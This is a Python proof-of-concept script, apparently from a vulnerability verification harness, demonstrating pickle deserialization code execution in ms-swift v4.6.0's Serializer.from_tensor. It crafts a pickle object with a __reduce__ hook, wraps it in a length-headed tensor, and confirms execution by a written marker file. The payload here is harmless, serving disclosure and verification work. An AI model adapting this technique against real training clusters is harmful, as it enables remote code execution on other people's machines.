"""ms-swift v4.6.0 Serializer.from_tensor pickle RCE (rank/node object channel, function level).

The verbatim pinned upstream ``swift/utils/torch_utils.py`` is loaded with the swift tree
stubbed; ``torch``, ``numpy``, ``pickle`` are the real installed builds.  ``Serializer``
carries objects between ranks as (int64 length header + pickle stream) tensors; a crafted
tensor makes the upstream ``pickle.loads`` execute the payload.
"""

from __future__ import annotations

import json
import pickle
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "lab" / "upstream_verify"))
from stublib import StubTree  # noqa: E402


def _materialize(marker_path: str, marker_text: str):
    Path(marker_path).write_text(marker_text, encoding="utf-8")
    return {"carried": "object"}


class _Payload:
    def __init__(self, marker_path: str, marker_text: str):
        self.marker_path = marker_path
        self.marker_text = marker_text

    def __reduce__(self):
        return (_materialize, (self.marker_path, self.marker_text))


def main() -> None:
    import numpy as np
    import torch

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    source = poclib.upstream_path(manifest["root_cause"]["source"])
    if not source.is_file():
        poclib.fail(f"missing pinned upstream source: {source}")

    tree = StubTree(["swift", "modelscope"]).install()
    tree.seed(
        "swift.utils.env",
        get_dist_setting=lambda *a, **k: (0, 0, 0, 1, "127.0.0.1", "127.0.0.1"),
        get_node_setting=lambda *a, **k: (0,),
        is_dist=lambda *a, **k: False,
        is_local_master=lambda *a, **k: True,
        is_master=lambda *a, **k: True,
        is_mp=lambda *a, **k: False,
    )
    module = tree.load(source, "swift.utils.torch_utils")
    if not hasattr(module, "Serializer"):
        poclib.fail("upstream torch_utils module did not expose Serializer")

    poclib.start_marker("ABSENT")
    payload = pickle.dumps(_Payload(str(poclib.MARKER_FILE), poclib.MARKER_TEXT), protocol=4)
    wire = np.array([len(payload)], dtype=np.int64).tobytes() + payload
    tensor = torch.from_numpy(np.frombuffer(wire, dtype=np.uint8).copy())

    # sanity: the upstream encoder round-trips plain objects through the same channel
    benign = module.Serializer.to_tensor({"hello": "swift"})
    assert module.Serializer.from_tensor(benign) == {"hello": "swift"}

    post_sink_error = None
    result = None
    try:
        result = module.Serializer.from_tensor(tensor)
    except Exception as exc:  # the sink has already executed the payload
        post_sink_error = f"{type(exc).__name__}: {exc}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written inside the upstream Serializer.from_tensor pickle.loads",
                    post_sink_error=post_sink_error)

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+Serializer.from_tensor+pickle.loads(tensor bytes)",
                "entrypoint": "swift.utils.torch_utils.Serializer.from_tensor",
                "source": poclib.rel(source),
                "source_sha256": poclib.sha256_file(source),
                "sink_line": manifest["root_cause"]["line"],
                "sink": manifest["root_cause"]["snippet"],
                "wire_format": "int64 length header + pickle stream (uint8 tensor)",
                "payload": "pickle __reduce__ -> _materialize(marker)",
                "deserialized": str(result),
                "torch_version": torch.__version__,
                "post_sink_error": post_sink_error,
                "stubbed_modules": tree.manifest()["stubbed_modules"],
            },
            "request_response": [
                {
                    "dir": "injected rank/node tensor -> Serializer.from_tensor -> pickle.loads",
                    "payload": "pickle reduce",
                    "result": "marker written inside the upstream sink",
                }
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
